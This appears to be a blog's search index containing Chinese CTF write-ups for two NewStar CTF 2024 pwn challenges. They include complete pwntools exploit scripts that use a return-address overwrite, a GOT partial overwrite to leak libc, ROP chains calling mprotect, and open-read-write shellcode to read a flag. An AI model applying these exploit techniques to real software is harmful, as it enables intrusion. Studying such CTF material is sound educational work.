<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Week3_不思議なscanf</title>
    <link href="/2024/12/01/Week3-%E4%B8%8D%E6%80%9D%E8%AD%B0%E3%81%AAscanf/"/>
    <url>/2024/12/01/Week3-%E4%B8%8D%E6%80%9D%E8%AD%B0%E3%81%AAscanf/</url>
    
    <content type="html"><![CDATA[<h1 id="Week3-不思議なscanf"><a href="#Week3-不思議なscanf" class="headerlink" title="Week3_不思議なscanf"></a>Week3_不思議なscanf</h1><p><strong>安全策略</strong></p><p><img src="https://sh1j1.github.io/img/NewStar/%E4%B8%8D%E6%80%9D%E8%AD%B0%E3%81%AAscanf.assets/%257B1216F1B5-754A-4807-AE68-EB3744EEA591%257D.png" alt="{1216F1B5-754A-4807-AE68-EB3744EEA591}"></p><p>修改了返回地址，调用堆栈的情况也发生了变化</p><p><img src="https://sh1j1.github.io/img/NewStar/%E4%B8%8D%E6%80%9D%E8%AD%B0%E3%81%AAscanf.assets/Snipaste_2024-12-01_19-51-20.png" alt="Snipaste_2024-12-01_19-51-20"></p><p>我下载的附件有点问题可能，试用官方wp时，出现这种情况，调用堆栈不对也能打到后门</p><p><img src="https://sh1j1.github.io/img/NewStar/%E4%B8%8D%E6%80%9D%E8%AD%B0%E3%81%AAscanf.assets/%257BE9C9A978-3D36-4F00-A78E-5A1637686EAD%257D.png" alt="{E9C9A978-3D36-4F00-A78E-5A1637686EAD}"></p><p>问了师傅们，出题人Chovy师傅给了原本的函数图</p><p><img src="https://sh1j1.github.io/img/NewStar/%E4%B8%8D%E6%80%9D%E8%AD%B0%E3%81%AAscanf.assets/A46EEE51CFF7EEC391BE78F5E178D674.png" alt="A46EEE51CFF7EEC391BE78F5E178D674"></p><p><strong>exp</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&quot;amd64&quot;</span>,log_level = <span class="hljs-string">&quot;debug&quot;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = remote(&#x27;192.168.65.1&#x27;,6666)</span><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#ELFpath = &#x27;./pwn&#x27;</span><br><span class="hljs-comment">#p=process([&#x27;./ld-linux-x86-64.so.2&#x27;, ELFpath], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="hljs-comment">#elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.send(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.sendline(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendlineafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">n</span>): <span class="hljs-keyword">return</span> p.recv(n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span>  p.recvuntil(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ti</span>(): <span class="hljs-keyword">return</span> p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pp</span>(<span class="hljs-params">a</span>): <span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>(): <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a</span>): <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get32</span>(): <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get64</span>(): <span class="hljs-keyword">return</span> u32(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getlibc</span>(<span class="hljs-params">a</span>): <span class="hljs-keyword">return</span> libc_base + libc.sym[a]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    pause()<br>    gdb.attach(p)<br><br>backdoor = <span class="hljs-number">0x401281</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    sla(<span class="hljs-string">&#x27;ます！&#x27;</span>,<span class="hljs-string">b&#x27;+&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;ます！&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x401261</span>))<span class="hljs-comment">#说明绕过mov rbp,rsp的栈对齐就可以了</span><br><span class="hljs-comment">#0x401240|41|61|62</span><br>ru(<span class="hljs-string">&#x27;ます！&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>pause()<br>gdb.attach(p)<br><span class="hljs-comment">#sl(b&#x27;0&#x27;)</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    sla(<span class="hljs-string">&#x27;ます！&#x27;</span>,<span class="hljs-string">b&#x27;+&#x27;</span>)<br>ti()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>NewStar</category>
      
    </categories>
    
    
    <tags>
      
      <tag>每天一题的比赛复盘</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Week3_OneLastB1te</title>
    <link href="/2024/11/28/Week3-OneLastB1te/"/>
    <url>/2024/11/28/Week3-OneLastB1te/</url>
    
    <content type="html"><![CDATA[<h1 id="Week3-One-Last-B1te"><a href="#Week3-One-Last-B1te" class="headerlink" title="Week3_One_Last_B1te"></a>Week3_One_Last_B1te</h1><p><strong>安全策略</strong></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BA63B9B7C-94D0-475F-9879-0FB051585F29%7D.png" alt="{A63B9B7C-94D0-475F-9879-0FB051585F29}"></p><p><strong>查看沙盒限制</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><p>0008:是return ALLOW所以当goto 0008就是只允许</p><p>0009:是return KILL所以当goto 0009就是禁止</p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BC8DF1A8A-484C-4556-B420-EFD0C2E76A56%7D.png" alt="{C8DF1A8A-484C-4556-B420-EFD0C2E76A56}"></p><p><strong>逆向分析</strong></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/image-20241126091458741.png" alt="image-20241126091458741"></p><p>修改buf指针的地址，可以随机写入1字节数据，由于存在延迟绑定(第一次调用函数时通过指针调用函数)，修改close的plt指向write泄露libc或ld地址</p><p>修改都将修改地址存放值</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/Snipaste_2024-11-27_21-21-28.png" alt="Snipaste_2024-11-27_21-21-28"></p><p>mprotect开拓空间,read_orw,ret</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;192.168.65.1&#x27;</span>, <span class="hljs-number">6666</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendlineafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.sendline(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sd</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.send(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc</span>(<span class="hljs-params">n</span>): <span class="hljs-keyword">return</span> p.recv(n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.recvuntil(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ti</span>(): <span class="hljs-keyword">return</span> p.interactive()<br><br>ret = <span class="hljs-number">0x401144</span><br>main = <span class="hljs-number">0x4013A3</span><br>sd(p64(elf.got[<span class="hljs-string">&#x27;close&#x27;</span>]))<br>sd(<span class="hljs-string">b&#x27;\xc0&#x27;</span>)<br>sd(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(ret)+p64(main))<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>rc(<span class="hljs-number">0xa0</span>)<br>libc_base =  u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>libc_base -= <span class="hljs-number">0x2A28B</span><br>rubbish = <span class="hljs-number">0x404800</span><br>sd(p64(rubbish))<br>sd(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x10f75b</span><br>pop_rsi = libc_base + <span class="hljs-number">0x110a4d</span><br>xchg_eax_edx = libc_base + <span class="hljs-number">0x1a7f27</span><br><span class="hljs-comment">#xchg_eax_edx = libc_base + </span><br>pop_rax = libc_base + <span class="hljs-number">0xdd237</span><br>read_a = libc_base + <span class="hljs-number">0x11BA50</span><br>mprotect = libc_base + <span class="hljs-number">0x125C10</span><br>pop_rax = libc_base + <span class="hljs-number">0xdd237</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_rdi)+p64(libc_base+<span class="hljs-number">0x202000</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x2000</span>)+p64(pop_rax)+p64(<span class="hljs-number">7</span>)+p64(xchg_eax_edx)+p64(mprotect)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(libc_base+<span class="hljs-number">0x202000</span>)+p64(pop_rax)+p64(<span class="hljs-number">0x1000</span>)+p64(xchg_eax_edx)+p64(read_a)+p64(libc_base+<span class="hljs-number">0x202000</span>)<br>sd(payload)<br>shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>shellcode += shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,libc_base+<span class="hljs-number">0x202000</span>+<span class="hljs-number">0x800</span>,<span class="hljs-number">0x200</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">2</span>,libc_base+<span class="hljs-number">0x202000</span>+<span class="hljs-number">0x800</span>,<span class="hljs-string">&#x27;rax&#x27;</span>)<br>sd(asm(shellcode))<br>ti()<br></code></pre></td></tr></table></figure><p>ROP链执行orw</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;192.168.65.1&#x27;</span>, <span class="hljs-number">6666</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">s, n</span>): <span class="hljs-keyword">return</span> p.sendlineafter(s, n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.sendline(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sd</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.send(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc</span>(<span class="hljs-params">n</span>): <span class="hljs-keyword">return</span> p.recv(n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">s</span>): <span class="hljs-keyword">return</span> p.recvuntil(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ti</span>(): <span class="hljs-keyword">return</span> p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>(): <span class="hljs-keyword">return</span>  u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>close_got = elf.got[<span class="hljs-string">&#x27;close&#x27;</span>]<br>ru(<span class="hljs-string">b&#x27;Show me your UN-Lucky number : &#x27;</span>)<br>sd(p64(close_got))<br>ru(<span class="hljs-string">b&#x27;Try to hack your UN-Lucky number with one byte :&#x27;</span>)<br>sd(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sd(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x404200</span>)+p64(<span class="hljs-number">0x4013D2</span>))<span class="hljs-comment">#这里的rbp太妙了</span><br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    libc_base = ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)<br>libc_base = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>libc_base -= <span class="hljs-number">0x2a28b</span><br>sd(p64(close_got))<br>ru(<span class="hljs-string">b&#x27;Try to hack your UN-Lucky number with one byte :&#x27;</span>)<br>sd(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x10f75b</span><br>pop_rsi = libc_base + <span class="hljs-number">0x110a4d</span><br>pop_rax = libc_base + <span class="hljs-number">0xdd237</span><br>open_a = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_a = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_a = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(pop_rdi)+p64(<span class="hljs-number">0x4041f0</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_a)+p64(pop_rdi)+p64(<span class="hljs-number">0x404000</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404080</span>+<span class="hljs-number">5</span>)+p64(libc_base+<span class="hljs-number">0xbf450</span>)+p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404200</span>)+p64(read_a)+p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404200</span>)+p64(write_a)<br>sd(payload)<br>ti()<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7B1B8C24F9-D8F3-4BAB-BE85-22A6A060EFF1%7D.png" alt="{1B8C24F9-D8F3-4BAB-BE85-22A6A060EFF1}"></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7B2ECE4B8E-0777-40EE-9B3F-2ABB075B1D9D%7D.png" alt="{2ECE4B8E-0777-40EE-9B3F-2ABB075B1D9D}"></p><p>泄露了<code>__libc_start_main+139</code></p><h2 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h2><p>使用mprotect给一个空间执行权限，读写shellcode到目标空间，跳转执行</p><p>通过xchg指令给rdx寄存器赋值</p><p><a href="https://ns.openctf.net/wp/2024/week3/pwn/one-last-b1te.html">One Last B1te | WriteUp - NewStar CTF 2024</a></p><p>修改close_got的重定向地址，close_plt &#x3D; 0x4010f0，修改地址的低字节即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="hljs-comment"># gcc pwn.c -o pwn -masm=intel -no-pie -fno-stack-protector -l seccomp</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>ELFpath = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>p=remote(<span class="hljs-string">&#x27;192.168.65.1&#x27;</span>,<span class="hljs-number">6666</span>)<br><br>close_got=<span class="hljs-number">0x404028</span><br>write_plt=<span class="hljs-number">0x4010c0</span><br><br>p.sendafter(<span class="hljs-string">&quot;Show me your UN-Lucky number :&quot;</span>,p64(close_got))<br>p.sendafter(<span class="hljs-string">&quot;Try to hack your UN-Lucky number with one byte :&quot;</span>,<span class="hljs-string">b&#x27;\xc0&#x27;</span>)<br>ret=<span class="hljs-number">0x0401447</span><br>main=<span class="hljs-number">0x4013a3</span><br>rubbish=<span class="hljs-number">0x404000</span>+<span class="hljs-number">0x800</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(ret)+p64(main)<br>pause()<span class="hljs-comment">#程序运行会停顿，便于观看debug日志</span><br><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>p.recv(<span class="hljs-number">0xb8</span>-<span class="hljs-number">0x18</span>)<span class="hljs-comment">#接收libc泄露与返回地址之间字节</span><br>libc_base=u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)-<span class="hljs-number">0x710b26c2a28b</span>+<span class="hljs-number">0x710b26c00000</span><br>p.sendafter(<span class="hljs-string">&quot;Show me your UN-Lucky number :&quot;</span>,p64(rubbish))<br>p.sendafter(<span class="hljs-string">&quot;Try to hack your UN-Lucky number with one byte :&quot;</span>,<span class="hljs-string">b&#x27;\x70&#x27;</span>)<br><br>pop_rdi=libc_base+<span class="hljs-number">0x010f75b</span><br>pop_rsi=libc_base+<span class="hljs-number">0x110a4d</span><br>binsh=libc_base+<span class="hljs-number">0x1cb42f</span><br>xchg_edx_eax=libc_base+<span class="hljs-number">0x01a7f27</span><br>pop_rax=libc_base+<span class="hljs-number">0x0dd237</span><br>open_a=libc_base+<span class="hljs-number">0x011B120</span><br>read_a=libc_base+<span class="hljs-number">0x011BA50</span><br>mprotect=libc_base+<span class="hljs-number">0x00125C10</span><br><span class="hljs-comment">#使用pop_rax,参数，xchg_edx_eax，实现rdx赋值为rax，高字节是0清空了</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_rdi)+p64(libc_base+<span class="hljs-number">0x202000</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x2000</span>)+p64(pop_rax)+p64(<span class="hljs-number">7</span>)+p64(xchg_edx_eax)+p64(mprotect)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(libc_base+<span class="hljs-number">0x202000</span>)+p64(pop_rax)+p64(<span class="hljs-number">0x1000</span>)+p64(xchg_edx_eax)+p64(read_a)+p64(libc_base+<span class="hljs-number">0x202000</span>)<br>pause()<br>p.send(payload)<br>pause()<br><br>shellcode=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#系统调用中rax通常用于存储系统调用的返回值</span><br><span class="hljs-comment">#open\read返回的文件描述符与字节数都在rax中</span><br>shellcode+=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<span class="hljs-comment">#调用成功文件描述符为3或更大</span><br>shellcode+=shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,libc_base+<span class="hljs-number">0x202000</span>+<span class="hljs-number">0x800</span>,<span class="hljs-number">0x100</span>)<br><span class="hljs-comment">#每个进程内核都有一个文件描述符表，存储文件描述符与内核中文件表项对应关系</span><br><span class="hljs-comment">#文件描述符是文件描述符表的索引，指向一个指针（文件表项）</span><br>shellcode+=shellcraft.write(<span class="hljs-number">2</span>,libc_base+<span class="hljs-number">0x202000</span>+<span class="hljs-number">0x800</span>,<span class="hljs-string">&#x27;rax&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7B94C0EAA4-CB01-468F-B4D8-8F780C5288E5%7D.png" alt="{94C0EAA4-CB01-468F-B4D8-8F780C5288E5}"></p><p>不能用ROPgadget查系统调用，mprotect可以通过查找触发系统调用的指令序列来搜索，如搜<code>syscall</code>、<code>mov rax</code></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BACDC5A6D-334C-423A-B2EB-91D1D97B7E8B%7D.png" alt="{ACDC5A6D-334C-423A-B2EB-91D1D97B7E8B}"></p><p><code>xchg edx，eax；</code>是如何修改整个的rdx的</p><p>32位寄存器的写操作会自动清零寄存器的高32位，硬件架构为了简化操作和提高效率的一个特性</p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7BCD7C158C-6648-48CE-BF47-79E6A698B857%7D.png" alt="{CD7C158C-6648-48CE-BF47-79E6A698B857}"></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7B5EE78C1C-769A-4E4D-84BF-DCBC226C117B%7D.png" alt="{5EE78C1C-769A-4E4D-84BF-DCBC226C117B}"></p><p><img src="https://sh1j1.github.io/img/NewStar/One_Last_B1te.assets/%7B39C3B2D1-6996-4247-89FF-E34957E66D48%7D.png" alt="{39C3B2D1-6996-4247-89FF-E34957E66D48}"></p><h3 id="mprotect地址选择"><a href="#mprotect地址选择" class="headerlink" title="mprotect地址选择"></a>mprotect地址选择</h3><p>libc中的.bss|.data|栈|堆|适合，plt|got|.text不推荐</p><h3 id="orw中函数参数作用"><a href="#orw中函数参数作用" class="headerlink" title="orw中函数参数作用"></a>orw中函数参数作用</h3><h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>int open(const char *pathname, int flags, mode_t mode);</p><p>open(‘文件路径’，文件模式(0只读，1只写，2读写)，mode(指定新文件权限,设0或0—类似linux文件权限))</p><ul><li>成功：返回文件描述符，非负整数</li><li>失败：-1，设置为errno</li></ul><blockquote><p><strong>1</strong>确保文件以<code>NULL</code>结尾，否则open会失败</p><p><strong>2</strong>程序运行用户对文件有读取权限</p><p><strong>3</strong>对于已存在的文件，mode会被忽略，任意值都不会产生影响</p></blockquote><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>ssize_t read(int fd, void *buf, size_t count);</p><p>read(文件描述符，缓冲区指针，最大读取字节数)</p><ul><li>成功：返回实际读取字节数</li><li>失败：-1，设置为errno</li></ul><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>ssize_t write(int fd, const void *buf, size_t count);</p><p>write(文件描述符，数据源缓冲区指针，写入字节数)</p><ul><li>成功：实际写入字节数</li><li>失败：返回-1，设置errno</li></ul><h4 id="文件描述符-fd"><a href="#文件描述符-fd" class="headerlink" 